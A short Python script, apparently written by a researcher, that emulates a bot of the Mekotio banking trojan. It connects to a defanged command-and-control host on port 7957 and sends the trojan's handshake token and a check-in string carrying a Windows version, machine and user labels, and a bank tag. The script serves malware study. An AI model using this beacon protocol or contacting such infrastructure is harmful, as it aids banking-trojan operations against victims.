# mekotio-client.py
#Simula ser un Bot de Mekotio 
import socket
from time import sleep

HOST = "boludo{.duia{.us"  #c&cMekotio
PORT = 7957 #port

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    print("Connecting to:" + HOST + ':' + str(PORT))
    s.sendall(b'<|SNUNFHXQU|>')
    data = s.recv(1024)
    print(f"Received {data!r}")
    s.sendall(b'<|xywz|>1--03-01-N-96<|>32 - Windows 10.1331.12410<|>CONCESIONARIO JavierP windows defender-galiciacomar<|>CONCESIONARIO DanielO<<|6//&M31R543V36m!galiciacomar')
    data = s.recv(1024)
    print(f"Received {data!r}")
